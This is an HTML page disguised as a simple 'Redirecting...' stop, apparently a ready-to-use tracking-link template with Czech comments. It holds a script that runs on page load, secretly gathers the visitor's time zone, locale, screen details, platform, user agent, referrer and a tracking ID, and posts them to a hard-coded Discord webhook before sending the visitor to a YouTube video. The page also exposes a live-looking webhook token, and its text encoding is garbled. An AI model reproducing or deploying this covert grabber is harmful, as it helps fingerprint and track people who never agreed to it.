
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <script>
    const webhookURL = "https://discordapp.com/api/webhooks/1400862351896481865/fats3duHY0d3z9OuFkjxnLANFj4a5qwMwnEWvZI_Lscx9CO6CJuBusX_AdnPoknF5Nzi"; // <- Nahraƒè svou URL
    const uid = new URLSearchParams(window.location.search).get("uid") || "N/A";

    function detectDevice() {
      const width = window.screen.width;
      const isTouch = 'ontouchstart' in window;
      if (width <= 768 || isTouch) return "Mobile";
      if (width > 768 && width <= 1024) return "Tablet";
      return "Desktop";
    }

    const now = new Date();
    const localTime = now.toLocaleString("cs-CZ");
    const locale = Intl.DateTimeFormat().resolvedOptions().locale || navigator.language;

    const data = {
      content: `üß† New access logged:
‚Ä¢ Time (UTC): ${now.toISOString()}
‚Ä¢ Local Time: ${localTime}
‚Ä¢ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
‚Ä¢ Locale: ${locale}
‚Ä¢ UID: ${uid}
‚Ä¢ Device: ${detectDevice()}
‚Ä¢ Screen: ${window.screen.width}x${window.screen.height}
‚Ä¢ Color Depth: ${window.screen.colorDepth}
‚Ä¢ Pixel Ratio: ${window.devicePixelRatio}
‚Ä¢ Language: ${navigator.language}
‚Ä¢ Platform: ${navigator.platform}
‚Ä¢ Cookies Enabled: ${navigator.cookieEnabled}
‚Ä¢ Java Enabled: ${navigator.javaEnabled && navigator.javaEnabled()}
‚Ä¢ User-Agent: ${navigator.userAgent}
‚Ä¢ Referrer: ${document.referrer || "N/A"}
‚Ä¢ Page URL: ${window.location.href}`
    };

    fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    }).finally(() => {
      // P≈ôesmƒõrov√°n√≠ na YouTube video
      window.location.href = "https://youtu.be/4Fy9PcTYm90"; // <- Nahraƒè sv√Ωm videem
    });
  </script>
</head>
<body>
  <p>Redirecting...</p>
</body>
</html>
